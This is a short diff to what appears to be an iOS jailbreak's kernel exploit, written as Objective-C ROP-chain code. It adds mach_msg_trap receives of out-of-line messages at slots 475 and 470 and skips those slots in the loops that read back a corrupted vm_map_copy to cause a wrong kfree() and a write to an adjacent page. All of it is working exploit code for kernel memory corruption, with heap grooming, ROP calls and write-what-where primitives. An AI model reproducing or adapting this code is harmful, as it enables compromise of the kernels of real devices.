@@ -1117,6 +1117,8 @@ StoreR0(push, where)
     [dy setSlide:dy.slide-1]; // exit thumb
     
     RopCallFunction9Deref1(PUSH, @"_mach_msg_trap", 4, SEG_VAR(holder[480]), SEG_VAR(cur_oolmsg), MACH_RCV_MSG, 0, sizeof(oolmsgrcv_t), 0, 0, 0,0,0); // + 1024
+    RopCallFunction9Deref1(PUSH, @"_mach_msg_trap", 4, SEG_VAR(holder[475]), SEG_VAR(cur_oolmsg), MACH_RCV_MSG, 0, sizeof(oolmsgrcv_t), 0, 0, 0,0,0); // + 1024
+    RopCallFunction9Deref1(PUSH, @"_mach_msg_trap", 4, SEG_VAR(holder[470]), SEG_VAR(cur_oolmsg), MACH_RCV_MSG, 0, sizeof(oolmsgrcv_t), 0, 0, 0,0,0); // + 1024
     
     [dy setSlide:dy.slide+1]; // enter thumb
     RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_io_connect_method_scalarI_structureI),
@@ -1144,7 +1146,7 @@ RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(msg), MACH_SEND_MSG, sizeof(oo
     /* read-out corrupted vm_map_copy, causing wrong kfree() & write to adjacent page */
     
     for (int i = 450; i < 500; i++) {
-        if (i != 480) {
+        if (i != 480 && i != 475 && i != 470) {
             WriteWhatWhere(PUSH, 0, SEG_VAR(oflow_msg.desc.address));
             RecvMsg(PUSH, i, oflow_msg);
             StoreR0(PUSH, SEG_VAR(tmp1));
@@ -1276,7 +1278,7 @@ RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(msg), MACH_SEND_MSG, sizeof(oo
     PUSH = m_m_scratch; // R7
     
     for (int i = 400; i < 500; i++) {
-        if (i != 480) {
+        if (i != 480 && i != 475 && i != 470) {
             WriteWhatWhere(PUSH, 0, SEG_VAR(oflow_msg.desc.address));
             RecvMsg(PUSH, i, oflow_msg);
             StoreR0(PUSH, SEG_VAR(tmp1));
